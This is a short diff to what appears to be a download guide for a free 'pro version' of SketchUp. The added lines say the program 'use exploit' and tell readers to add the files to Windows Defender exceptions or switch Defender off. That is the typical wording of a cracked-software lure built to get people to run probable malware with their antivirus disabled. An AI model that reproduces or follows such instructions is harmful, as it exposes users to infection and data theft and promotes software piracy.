@@ -9,3 +9,5 @@ How Download SketchUp Pro?
 4. Wait 3-4 min before program download
 
 5. Run program and enjoy pro version absolutly free!!
+
+Warning!!! Because this program use exploit - win defender can delete them. Add the files to exception, or off windows defender!!!
